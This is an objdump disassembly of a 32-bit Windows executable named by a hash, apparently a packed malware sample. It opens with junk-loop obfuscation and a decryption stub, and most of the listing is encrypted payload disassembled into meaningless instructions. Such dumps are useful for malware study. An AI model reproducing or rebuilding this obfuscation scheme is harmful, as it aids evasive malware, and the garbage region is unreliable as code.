
c36134c655edc963a7014f7275039662279c6d4ab6dbe23a709206d584dca42c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421952
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421a5e
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4234de
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4235a5
  4012ea:	push   0x423629
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	call   0x40914a
  401431:	test   eax,eax
  401433:	je     0x401464
  401439:	lea    eax,[ebp-0x90]
  40143f:	push   eax
  401440:	mov    eax,DWORD PTR [ebp-0x30]
  401443:	xor    eax,esi
  401445:	add    eax,edi
  401447:	push   eax
  401448:	mov    eax,DWORD PTR [ebp-0x2c]
  40144b:	add    eax,0xaa
  401450:	push   eax
  401451:	mov    eax,DWORD PTR [ebp-0x2c]
  401454:	mov    eax,DWORD PTR [eax+0x198]
  40145a:	push   DWORD PTR [eax]
  40145c:	call   0x405c6f
  401461:	mov    DWORD PTR [ebp-0x40],eax
  401464:	lea    eax,[ebp+0x4]
  401467:	mov    DWORD PTR [ebp-0x34],eax
  40146a:	mov    eax,DWORD PTR [ebp-0x8]
  40146d:	mov    eax,DWORD PTR [eax]
  40146f:	mov    eax,DWORD PTR [eax]
  401471:	mov    eax,DWORD PTR [eax]
  401473:	test   eax,eax
  401475:	je     0x4038ab
  40147b:	lea    eax,[ebp-0xc]
  40147e:	mov    DWORD PTR [ebp-0x4c],eax
  401481:	mov    eax,DWORD PTR [ebp-0x3c]
  401484:	mov    DWORD PTR [ebp-0xc],eax
  401487:	mov    eax,DWORD PTR [ebp-0x8]
  40148a:	mov    eax,DWORD PTR [eax]
  40148c:	mov    eax,DWORD PTR [eax]
  40148e:	mov    eax,DWORD PTR [eax]
  401490:	sub    DWORD PTR [ebp-0xc],eax
  401493:	mov    ecx,DWORD PTR [ebp-0x10]
  401496:	xor    ecx,esi
  401498:	mov    eax,0xffcd8d25
  40149d:	sub    eax,ecx
  40149f:	jmp    0x403854
  4014a4:	out    dx,al
  4014a5:	add    eax,0x6723a723
  4014aa:	outs   dx,BYTE PTR ds:[esi]
  4014ab:	sbb    DWORD PTR [edx+0x1b],0xf
  4014af:	hlt    
  4014b0:	fucom  st(3)
  4014b2:	cs int 0x62
  4014b5:	bound  esp,QWORD PTR [edx+0x62]
  4014b8:	retf   0x625f
  4014bb:	bound  ecx,QWORD PTR [ecx]
  4014bd:	sub    eax,DWORD PTR [edi]
  4014bf:	pop    edx
  4014c0:	add    eax,0x792c0356
  4014c5:	pop    ebx
  4014c6:	jne    0x40150f
  4014c8:	xchg   esi,eax
  4014c9:	inc    esi
  4014ca:	jb     0x401510
  4014cc:	jno    0x4014f3
  4014ce:	iret   
  4014cf:	retf   
  4014d0:	hlt    
  4014d1:	inc    ebp
  4014d2:	aam    0x97
  4014d4:	cdq    
  4014d5:	add    ebp,DWORD PTR [edx]
  4014d7:	pop    esp
  4014d8:	jno    0x401544
  4014da:	mov    es,WORD PTR [edx-0x43be3b9c]
  4014e0:	daa    
  4014e1:	mov    ecx,0x54f9627
  4014e6:	shr    BYTE PTR [ebp+eax*1+0x2],1
  4014ea:	adc    cl,al
  4014ec:	(bad)  
  4014ed:	(bad)  [esi-0x78]
  4014f0:	and    BYTE PTR [esi+0x31c900b0],dl
  4014f6:	dec    esi
  4014f7:	fbstp  TBYTE PTR [edx-0x62cc368d]
  4014fd:	mov    cs,WORD PTR [eax+0x78]
  401500:	jo     0x4014b8
  401502:	dec    edi
  401503:	pushf  
  401504:	pop    eax
  401505:	jae    0x401491
  401507:	sti    
  401508:	push   es
  401509:	push   0xc72c3d54
  40150e:	pop    esi
  40150f:	cmp    BYTE PTR [edx+0x6c],dl
  401512:	add    ecx,DWORD PTR [edi]
  401514:	push   ss
  401515:	jge    0x40153e
  401517:	mov    ebx,0xa6ab63c3
  40151c:	mov    esp,0xc531c291
  401521:	stc    
  401522:	inc    ebx
  401523:	popf   
  401524:	xchg   edx,eax
  401525:	in     eax,0x12
  401527:	fstp   QWORD PTR [edx]
  401529:	jg     0x4014c9
  40152b:	cmp    ecx,edi
  40152d:	mov    al,ds:0xdb808269
  401532:	dec    ecx
  401533:	loop   0x4014ee
  401535:	inc    eax
  401536:	or     BYTE PTR [ebx],0x2c
  401539:	inc    ebx
  40153a:	pop    ecx
  40153b:	mov    ecx,0xda183803
  401540:	xor    ebx,DWORD PTR [esi+0x22]
  401543:	sbb    ch,BYTE PTR [ebx+ecx*1]
  401546:	inc    esi
  401547:	add    esp,DWORD PTR [eax-0x32d94fe1]
  40154d:	dec    ebp
  40154e:	nop
  40154f:	xchg   edi,eax
  401550:	dec    esi
  401551:	mov    cl,0x25
  401553:	pop    ecx
  401554:	les    ebp,FWORD PTR [eax]
  401556:	sub    eax,ecx
  401558:	vpsubusw xmm0,xmm7,XMMWORD PTR [edi-0x25]
  40155d:	mov    edi,0xdb06d0ab
  401562:	test   al,0x7e
  401564:	bound  edx,QWORD PTR [ebp+0x268b1b46]
  40156a:	in     eax,0xc2
  40156c:	push   ds
  40156d:	sub    DWORD PTR [ebp+0x6c],0x51
  401571:	imul   ebp,edx,0xdfad0cb4
  401577:	xchg   esi,eax
  401578:	xor    al,0x39
  40157a:	(bad)  
  40157b:	and    dl,BYTE PTR [edx-0x1ea0627]
  401581:	jmp    0xbccb5b9b
  401586:	mov    edi,0xb6d636aa
  40158b:	xor    eax,0x749ab7bd
  401590:	iret   
  401591:	or     eax,0x48bfc2e2
  401596:	pop    ecx
  401597:	cmp    ecx,DWORD PTR [ecx+0x57]
  40159a:	push   eax
  40159b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40159c:	mov    edx,0x25c48993
  4015a1:	cmp    BYTE PTR [edx+ecx*2+0xb0901b3],0x8b
  4015a9:	push   cs
  4015aa:	in     al,0xe7
  4015ac:	pop    ds
  4015ad:	out    0xe,al
  4015af:	or     eax,0x9a711f23
  4015b4:	imul   ecx,DWORD PTR ds:[edi],0x4f534b08
  4015bb:	and    esp,DWORD PTR [edi+0x5]
  4015be:	mov    cx,0xb2b7
  4015c2:	ret    
  4015c3:	mov    ?,esp
  4015c5:	pop    ecx
  4015c6:	push   es
  4015c7:	dec    ebx
  4015c8:	xor    dl,bl
  4015ca:	or     al,0x32
  4015cc:	dec    ebp
  4015cd:	call   esi
  4015cf:	shr    BYTE PTR [ebx-0x6d],0x4e
  4015d3:	lock mov ah,bh
  4015d6:	ja     0x401560
  4015d8:	ret    0x7612
  4015db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015dc:	arpl   WORD PTR [edx+0x7462920a],bx
  4015e2:	mov    ds:0x460208cd,eax
  4015e7:	xor    eax,0xd78e9276
  4015ec:	hlt    
  4015ed:	imul   ebp,ebx,0xffffffee
  4015f0:	xor    ebp,DWORD PTR [eax]
  4015f2:	jnp    0x401649
  4015f4:	out    dx,eax
  4015f5:	dec    ebx
  4015f6:	mov    es,edi
  4015f8:	scas   al,BYTE PTR es:[edi]
  4015f9:	icebp  
  4015fa:	aaa    
  4015fb:	test   BYTE PTR [esi],0xcc
  4015fe:	jb     0x4015a5
  401600:	cmc    
  401601:	or     cl,BYTE PTR [esp+ebp*4+0x34]
  401605:	pop    esp
  401606:	(bad)  
  401607:	inc    ecx
  401608:	mov    ds:0xa4891989,eax
  40160d:	sahf   
  40160e:	mov    dh,0x35
  401610:	idiv   BYTE PTR [edx+0x3f]
  401613:	fistp  QWORD PTR [ebx]
  401615:	push   ecx
  401616:	popa   
  401617:	ror    BYTE PTR [eax+0x15fd74a0],cl
  40161d:	push   cs
  40161e:	(bad)  
  40161f:	bsr    eax,ebx
  401622:	popf   
  401623:	das    
  401624:	or     al,0x8f
  401626:	sub    DWORD PTR [esp+edx*2+0xb9898f6],0xffffff9c
  40162e:	push   ss
  40162f:	bound  ebx,QWORD PTR [ecx-0x61]
  401632:	sbb    al,BYTE PTR [edi+0x32]
  401635:	int    0x1b
  401637:	inc    ecx
  401638:	pushf  
  401639:	(bad)  
  40163a:	mov    edi,0x20fb967
  40163f:	inc    BYTE PTR [ecx+0x66]
  401642:	es rol bh,cl
  401645:	stos   BYTE PTR es:[edi],al
  401646:	add    eax,0xc864f822
  40164b:	fs ja  0x401673
  40164e:	into   
  40164f:	pop    esi
  401650:	das    
  401651:	dec    esp
  401652:	sub    al,0x5
  401654:	push   ss
  401655:	jle    0x40161e
  401657:	mov    esp,0x4e53b603
  40165c:	or     DWORD PTR [ebp+0xb318984],0x94ab0bc8
  401666:	dec    ebx
  401667:	ret    
  401668:	jmp    0xcbfa:0x55c7f7ca
  40166f:	jb     0x40168c
  401671:	jb     0x4016c2
  401673:	in     eax,0x28
  401675:	pop    ebx
  401676:	sbb    DWORD PTR [eax],edi
  401678:	addr16 popf 
  40167a:	pop    es
  40167b:	pop    DWORD PTR [esi+eiz*4-0x4c36d288]
  401682:	add    ebp,DWORD PTR [ecx-0x51]
  401685:	pop    DWORD PTR [ecx]
  401687:	cmp    edx,DWORD PTR [esi+0x3a]
  40168a:	(bad)  
  40168b:	push   ebp
  40168c:	ror    DWORD PTR [esi],1
  40168e:	pusha  
  40168f:	adc    eax,0x68e23379
  401694:	ret    0xf1ab
  401697:	xchg   edx,eax
  401698:	and    cl,ch
  40169a:	(bad)  
  40169b:	(bad)
  40169e:	cmp    ecx,DWORD PTR [eax]
  4016a0:	and    al,0x85
  4016a2:	lods   al,BYTE PTR ds:[esi]
  4016a3:	jle    0x401697
  4016a5:	cmp    DWORD PTR [eax-0x2e001bec],0xfffffffc
  4016ac:	dec    edi
  4016ad:	aas    
  4016ae:	jnp    0x4016c5
  4016b0:	lods   eax,DWORD PTR ds:[esi]
  4016b1:	rcl    DWORD PTR [edi+0x619822a2],0x8f
  4016b8:	cld    
  4016b9:	sbb    esi,DWORD PTR [ebp-0x7f]
  4016bc:	or     al,0x96
  4016be:	mov    al,0x8e
  4016c0:	clc    
  4016c1:	sbb    eax,0x8ecd9b3f
  4016c6:	push   ss
  4016c7:	xchg   BYTE PTR [esi+edi*4+0x19],cl
  4016cb:	jg     0x4016c7
  4016cd:	imul   edi,DWORD PTR [edx],0xffffffb9
  4016d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016d1:	packssdw mm2,mm2
  4016d4:	(bad)  
  4016d5:	cli    
  4016d6:	in     al,0x6d
  4016d8:	fdivr  DWORD PTR [esi]
  4016da:	xchg   esp,eax
  4016db:	test   DWORD PTR ds:0x18f07a37,edx
  4016e1:	xchg   ecx,eax
  4016e2:	sub    DWORD PTR [edx],0x7639877a
  4016e8:	sub    ebx,edi
  4016ea:	bound  esp,QWORD PTR [edi]
  4016ec:	cmp    al,0x6d
  4016ee:	dec    edx
  4016ef:	cmp    ah,dl
  4016f1:	jne    0x401713
  4016f3:	loop   0x401685
  4016f5:	cwde   
  4016f6:	in     al,0x9c
  4016f8:	push   ds
  4016f9:	and    al,0xf2
  4016fb:	jle    0x401742
  4016fd:	mov    ecx,0x3cc6927e
  401702:	mov    dl,0x29
  401704:	and    ebp,DWORD PTR [edi-0x6d]
  401707:	addr16 retf 
  401709:	xchg   esi,eax
  40170a:	fdivr  DWORD PTR [ecx-0x22]
  40170d:	sti    
  40170e:	mov    ebx,gs
  401710:	out    dx,eax
  401711:	je     0x401725
  401713:	sub    edx,ecx
  401715:	outs   dx,DWORD PTR ds:[esi]
  401716:	js     0x40169e
  401718:	lea    edi,[edi+eiz*1+0x57db2693]
  40171f:	xchg   ebp,eax
  401720:	test   BYTE PTR [ebx],al
  401722:	rol    DWORD PTR [edi-0x14167aca],cl
  401728:	fidivr WORD PTR [edi-0x7e]
  40172b:	lods   eax,DWORD PTR ds:[esi]
  40172c:	sbb    bl,0x77
  40172f:	ss mov al,0x5b
  401732:	inc    esp
  401733:	push   eax
  401734:	push   0x4c1c13c1
  401739:	test   DWORD PTR [ebx-0x1d8e5999],eax
  40173f:	push   eax
  401740:	push   ds
  401741:	in     eax,0x47
  401743:	rcl    bl,cl
  401745:	sub    bh,BYTE PTR [edx+0x6]
  401748:	cmp    BYTE PTR [eax],dl
  40174a:	mov    cs,WORD PTR [edi+edx*8+0x74]
  40174e:	ins    BYTE PTR es:[edi],dx
  40174f:	inc    eax
  401750:	jno    0x4016d7
  401752:	fsub   QWORD PTR [eax+0x1ec0c375]
  401758:	je     0x4017c6
  40175a:	rcr    DWORD PTR [ebx+0x26],1
  40175d:	mov    ebx,0x54438025
  401762:	les    ecx,FWORD PTR [ebx-0x6]
  401765:	jmp    0xe33c:0x8ac3ab54
  40176c:	dec    edx
  40176d:	pop    esp
  40176e:	ffree  st(7)
  401770:	loopne 0x4016f9
  401772:	imul   bp,WORD PTR [ecx+0x519f37a7],0x62
  40177a:	add    BYTE PTR [edx+ecx*4+0x54ad693],bh
  401781:	das    
  401782:	int    0x52
  401784:	cmp    al,0xbe
  401786:	popa   
  401787:	dec    ecx
  401788:	into   
  401789:	or     eax,0x71932a2
  40178e:	mov    edx,0xc085b011
  401793:	adc    DWORD PTR [eax+0x2ce27ef4],esi
  401799:	dec    eax
  40179a:	in     al,dx
  40179b:	jg     0x401766
  40179d:	fldlg2 
  40179f:	jb     0x4017ec
  4017a1:	jle    0x401760
  4017a3:	inc    edi
  4017a4:	dec    eax
  4017a5:	inc    ebp
  4017a6:	loop   0x40180e
  4017a8:	ret    0x28e1
  4017ab:	imul   ebx,DWORD PTR ds:0x9228db,0xaf5024ae
  4017b5:	fisubr WORD PTR [edi-0x3f2e4391]
  4017bb:	jnp    0x40174f
  4017bd:	inc    ecx
  4017be:	adc    BYTE PTR [eax+0x7534cf8b],al
  4017c4:	adc    DWORD PTR ds:0xb2f6f42e,edx
  4017ca:	sub    ah,BYTE PTR [ebx-0x2426da50]
  4017d0:	push   ebx
  4017d1:	cld    
  4017d2:	mov    esi,DWORD PTR [ebp-0xe4e4b6f]
  4017d8:	add    al,0x9e
  4017da:	inc    esi
  4017db:	int3   
  4017dc:	aas    
  4017dd:	push   esi
  4017de:	jae    0x401813
  4017e0:	pop    ecx
  4017e1:	or     edx,edx
  4017e3:	cmp    BYTE PTR [esi],0xbf
  4017e6:	fcomp  QWORD PTR [edx+0x71]
  4017e9:	and    DWORD PTR [ebp*1+0x3d8a931],ebx
  4017f0:	and    al,0x70
  4017f2:	sub    BYTE PTR [ebx+eax*1],bl
  4017f5:	ins    DWORD PTR es:[edi],dx
  4017f6:	fild   DWORD PTR [ecx-0x2c]
  4017f9:	and    eax,esi
  4017fb:	mov    edi,0xeda2cee6
  401800:	je     0x401872
  401802:	popf   
  401803:	iret   
  401804:	push   es
  401805:	cmc    
  401806:	mov    bl,al
  401808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401809:	fbld   TBYTE PTR [ebx-0x38]
  40180c:	jmp    0xd097:0x762f30ea
  401813:	cmp    BYTE PTR [ecx-0x305d353e],0x88
  40181a:	push   eax
  40181b:	lods   al,BYTE PTR ds:[esi]
  40181c:	dec    esi
  40181d:	sbb    bl,BYTE PTR [ecx+eax*1]
  401820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401821:	adc    ebx,DWORD PTR [edi+0x2c9b93d1]
  401827:	(bad)  
  401828:	repz lock mov ah,0x7b
  40182c:	clc    
  40182d:	sbb    edx,DWORD PTR [esi]
  40182f:	jl     0x401870
  401831:	outs   dx,DWORD PTR ds:[esi]
  401832:	xchg   esi,eax
  401833:	jecxz  0x4018aa
  401835:	add    al,0x40
  401837:	out    0xbf,eax
  401839:	xchg   ebx,eax
  40183a:	not    DWORD PTR [ecx-0x7d]
  40183d:	fcomp  st(2)
  40183f:	mov    bl,0x6
  401841:	das    
  401842:	xor    ebp,DWORD PTR [edi-0x2d]
  401845:	in     eax,dx
  401846:	(bad)  
  401847:	lea    eax,[edi]
  401849:	inc    ebp
  40184a:	(bad)  
  40184b:	loopne 0x40185c
  40184d:	fistp  WORD PTR [ebx-0x60]
  401850:	call   0x37bf:0x196ac7f4
  401857:	cmp    eax,0xc88d6efe
  40185c:	and    ch,ah
  40185e:	jne    0x4018ce
  401860:	repnz outs dx,DWORD PTR ds:[esi]
  401862:	xor    DWORD PTR [eax+0x4],eax
  401865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401866:	add    cl,al
  401868:	in     al,dx
  401869:	xchg   edi,eax
  40186a:	jno    0x4018df
  40186c:	mov    dl,0x6d
  40186e:	mov    edi,0x5c228d8a
  401873:	sub    DWORD PTR [esi-0x3627042c],esp
  401879:	sbb    dl,0x74
  40187c:	dec    eax
  40187d:	jno    0x4018ba
  40187f:	or     al,BYTE PTR gs:[edi-0x70]
  401883:	or     DWORD PTR [ebp+0x6d],edx
  401886:	les    esi,FWORD PTR [ecx-0x6f6f6216]
  40188c:	xchg   esp,eax
  40188d:	jp     0x401876
  40188f:	xchg   DWORD PTR [ecx-0x6b186082],edx
  401895:	sti    
  401896:	sbb    eax,0xe7bba645
  40189b:	ror    BYTE PTR [ebp-0x54],0x33
  40189f:	sbb    ecx,DWORD PTR ds:[eax]
  4018a2:	out    0xc4,eax
  4018a4:	add    eax,0x8f54eb1e
  4018a9:	ja     0x40190b
  4018ab:	into   
  4018ac:	aaa    
  4018ad:	(bad)
  4018b0:	fnstenv [edx+eax*1]
  4018b3:	int3   
  4018b4:	ins    BYTE PTR es:[edi],dx
  4018b5:	and    ebp,DWORD PTR [esp+edi*8+0x3472210]
  4018bc:	in     al,0xdb
  4018be:	mov    DWORD PTR [edx-0x7b],ecx
  4018c1:	aas    
  4018c2:	xor    DWORD PTR [edi+0x34],edx
  4018c5:	and    ebx,DWORD PTR [ecx-0x7d]
  4018c8:	jl     0x401919
  4018ca:	pushf  
  4018cb:	cli    
  4018cc:	push   ebx
  4018cd:	lds    ebx,FWORD PTR [edx]
  4018cf:	and    bl,ah
  4018d1:	mov    cl,0x4
  4018d3:	cmp    al,0xdc
  4018d5:	xchg   eax,esi
  4018d7:	push   esi
  4018d8:	in     al,0x8d
  4018da:	(bad)  [esi]
  4018dc:	out    0xbd,al
  4018de:	popf   
  4018df:	xchg   esi,eax
  4018e0:	push   es
  4018e1:	lds    ebx,FWORD PTR [edx]
  4018e3:	mov    ebp,DWORD PTR [ecx-0x80a4a08]
  4018e9:	jb     0x4018ed
  4018eb:	and    BYTE PTR [ebp-0x64],bh
  4018ee:	leave  
  4018ef:	dec    ebp
  4018f0:	iret   
  4018f1:	inc    ebp
  4018f2:	retf   
  4018f3:	mov    eax,0xb29c4d10
  4018f8:	outs   dx,BYTE PTR ds:[esi]
  4018f9:	call   eax
  4018fb:	add    dh,ah
  4018fd:	or     dl,BYTE PTR [esi]
  4018ff:	xchg   ecx,eax
  401900:	out    dx,al
  401901:	lds    esi,FWORD PTR [eax-0x356536c4]
  401907:	mov    ah,0x82
  401909:	adc    eax,0x29caa716
  40190e:	hlt    
  40190f:	jecxz  0x401958
  401911:	lahf   
  401912:	stos   DWORD PTR es:[edi],eax
  401913:	mov    ah,0x53
  401915:	test   DWORD PTR [ecx+0x6bca1b2c],eax
  40191b:	push   eax
  40191c:	pinsrw mm6,WORD PTR [ecx],0x89
  401920:	scas   eax,DWORD PTR es:[edi]
  401921:	jb     0x401914
  401923:	xor    cl,dl
  401925:	and    al,0xea
  401927:	ds cmc 
  401929:	aam    0x97
  40192b:	sahf   
  40192c:	cmp    bh,BYTE PTR [eax-0x60a690ad]
  401932:	xor    DWORD PTR [ecx],edx
  401934:	in     eax,0x7
  401936:	adc    cl,BYTE PTR [ebx]
  401938:	mov    esp,0xeed607a3
  40193d:	hlt    
